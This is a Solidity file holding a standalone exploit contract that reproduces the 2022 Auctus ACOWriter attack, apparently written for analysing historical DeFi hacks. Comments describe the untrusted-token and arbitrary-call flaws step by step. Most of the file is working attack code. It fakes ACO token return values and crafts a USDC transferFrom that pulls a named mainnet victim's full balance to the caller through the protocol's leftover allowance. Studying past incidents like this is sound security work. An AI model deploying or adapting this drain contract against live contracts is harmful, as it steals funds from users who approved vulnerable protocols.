// SPDX-License-Identifier: UNLICENSED
// pragma ^0.8.10 — must compile with the registry forge project's solc.
// 2022-03-Auctus PoC analysis file (standalone drain contract)
// Deep manual analysis marks (VULNERABILITY + EXPLOIT STEPS) added per instructions. Edits restricted to .sol only.
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-03-Auctus).
//
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// `ContractTest`, which inherits `MockACOToken` (so the test contract itself is
// both the attacker's entrypoint AND the fake "ACO token" it passes in). There is
// no standalone exploit contract to deploy, so we hand-author one here that
// faithfully copies the inline attack from test/Auctus_exp.sol::test() and the
// MockACOToken interface. Logic + constants are copied verbatim.

// VULNERABILITY: Untrusted acoToken + unrestricted exchange call in ACOWriter (double root cause)
// 1. acoToken trust: write() (ACOWriter.sol:96) does:
//      address _collateral = IACOToken(acoToken).collateral();
//      if (_isEther(_collateral)) IACOToken(acoToken).mintToPayable{value:collateralAmount}(msg.sender);
//    with zero check that the acoToken was legitimately created. _sellACOTokens also calls strikeAsset(), and _balanceOfERC20 etc use low-level on it.
// 2. Arbitrary call: setExchange modifier (lines 62-66) + _sellACOTokens (lines 115-140):
//      _exchange = exchangeAddress;
//      ...
//      (bool success,) = _exchange.call{value: address(this).balance}(exchangeData);
//      ... then strikeAsset() + conditional transfer of "premium" + forward remaining ETH
//    No access control, no selector whitelist, exchangeAddress can be any contract (here: the USDC token itself).
// Combined precondition: residual approvals on collateral tokens (e.g. USDC.approve(ACOWriter_addr, huge) from past legit writes in the non-ETH branch at lines 102-105).
// Why works: fake collateral()=0 forces 1-wei ETH path (no real collateral movement), faked balances/mints succeed, the call executes transferFrom with ACOWriter as msg.sender (leveraging allowance), strikeAsset/transfer path is also faked to no-op.
// Impact: theft of funds from any account that ever approved ACOWriter on any ERC20; in incident ~682k USDC was stolen from the specific holder. 

// EXPLOIT STEPS: (see run() implementation for exact calldata)
// 1. Attacker EOA calls AuctusDrain.run{value:1 wei}().
// 2. run() crafts exchangeData = USDC.transferFrom(VICTIM_HOLDER, msg.sender, bal) and calls ACOWriter.write{value:1}(this, 1, USDC, data).
// 3. ACOWriter nonReentrant + setExchange(USDC): require(value>0 && collateralAmount>0) pass.
// 4. _collateral = fake.collateral() == address(0) => mintToPayable{value:1}(msg.sender) [attacker impl returns 1].
// 5. _sellACOTokens: acoBal = _balanceOfERC20(fake, this)==1; _approveERC20(fake, erc20proxy,1) [succeeds]; _exchange.call{value:1}(transferFromData) executes as USDC.transferFrom(VICTIM, attacker, amt) [ACOWriter is msg.sender inside token, allowance exists].
// 6. token = strikeAsset()==this (not ether) => _transferERC20(this, msg.sender, 1) [fake]; remaining balance (if any) forwarded to msg.sender.
// 7. Attacker EOA receives the USDC. No state change on ACOWriter itself beyond the temp _exchange (reset on exit).

interface IACOWriter {
    function write(
        address acoToken,
        uint256 collateralAmount,
        address exchangeAddress,
        bytes calldata exchangeData
    ) external payable;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

contract AuctusDrain {
    // Real mainnet constants (copied verbatim from the Foundry test).
    address constant ACOWRITER = 0xE7597F774fD0a15A617894dc39d45A28B97AFa4f;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    // A protocol-held holder whose USDC the privileged proxy could move from.
    address constant VICTIM_HOLDER = 0xCB32033c498b54818e58270F341e5f6a3bce993B;

    // -----------------------------------------------------------------------
    // Fake "ACO token" interface — what ACOWriter.write() reads off the
    // attacker-supplied acoToken. Every method LIES so the writer's logic takes
    // the path the attacker wants:
    //   * collateral() == address(0)  -> `_isEther(_collateral)` is true, so the
    //     writer takes the ETH mint branch (mintToPayable) and does NOT pull any
    //     ERC-20 collateral from the caller up front. (see ACOWriter.write:100)
    //   * strikeAsset() == address(this) -> after the "sale", the writer tries to
    //     transfer the (fake) strike token to the caller; our transfer() is a
    //     no-op that returns true. (see _sellACOTokens:128)
    //   * balanceOf()/approve()/transfer()/mintToPayable() are stubbed so the
    //     writer's internal accounting calls all succeed. (_balanceOfERC20, _approveERC20 etc.)
    // -----------------------------------------------------------------------
    // VULNERABILITY: Trusting return values from untrusted acoToken (see header)
    // EXPLOIT STEPS: (detailed in run() + ACOWriter logic)
    // 1. collateral() lies -> ETH branch taken with 1 wei.
    function collateral() external view returns (address) {
        return address(0);
    }

    function strikeAsset() external view returns (address) {
        return address(this);
    }

    function mintToPayable(address) external payable returns (uint256) {
        return 1;
    }

    function balanceOf(address) external view returns (uint256) {
        return 1;
    }

    function approve(address, uint256) external returns (bool) {
        return true;
    }

    function transfer(address, uint256) external returns (bool) {
        return true;
    }

    // -----------------------------------------------------------------------
    // Entrypoint. Mirrors ContractTest.test() verbatim: pass THIS contract as the
    // acoToken, send 1 wei (write requires msg.value > 0), name the USDC proxy as
    // the "exchange", and hand it a transferFrom that pulls the victim holder's
    // entire USDC balance to msg.sender (the attacker EOA).
    // -----------------------------------------------------------------------
    // `run()` is payable: the recorder sends 1 wei here (attackValueWei), and
    // run() forwards that same 1 wei into ACOWriter.write{value:1} — mirroring
    // the Foundry test where the test contract funds the internal write() call
    // from its own balance.
    function run() external payable {
        uint256 amount = IERC20(USDC).balanceOf(VICTIM_HOLDER);
        bytes memory exchangeData = abi.encodeWithSelector(
            bytes4(keccak256("transferFrom(address,address,uint256)")),
            VICTIM_HOLDER,
            msg.sender,
            amount
        );
        // VULNERABILITY: Arbitrary `exchangeAddress` + `exchangeData` (full call controlled by attacker)
        // See ACOWriter._sellACOTokens: (bool success,) = _exchange.call{value: address(this).balance}(exchangeData);
        // (The setExchange modifier makes _exchange point to the supplied address for the duration of write.)
        // EXPLOIT STEPS:
        // 1. Attacker EOA calls AuctusDrain.run{value:1 wei}().
        // 2. Compute transferFrom calldata targeting VICTIM_HOLDER (who had approved ACOWRITER on USDC).
        // 3. IACOWriter(ACOWRITER).write{value:1}( acoToken=address(this), 1, exchangeAddress=USDC, exchangeData=transferFromData )
        // 4. In ACOWriter.write (nonReentrant, setExchange(USDC)):
        //    - require(msg.value>0 && collateral>0)
        //    - _collateral = IACOToken(aco=self).collateral() == 0 -> _isEther true
        //    - IACOToken(self).mintToPayable{value:1}(msg.sender)  [fake returns 1]
        // 5. _sellACOTokens(aco, data):
        //    - acoBal = _balanceOfERC20(self, this) ==1 (via staticcall to fake)
        //    - _approveERC20(self, erc20proxy, 1) [calls approve on fake -> true]
        //    - _exchange(=USDC).call( transferFrom(VICTIM, attacker, amt) )  --> USDC executes transferFrom since msg.sender==ACOWriter has allowance from VICTIM
        //    - token = strikeAsset() == self (not ether) -> _transferERC20(self, msg.sender, _balanceOf=1) [calls transfer on fake]
        //    - send any remaining balance to msg.sender
        // 6. Attacker receives victim's USDC. ~682k USDC drained in the real incident.
        IACOWriter(ACOWRITER).write{value: 1}(address(this), 1, USDC, exchangeData);
    }
}
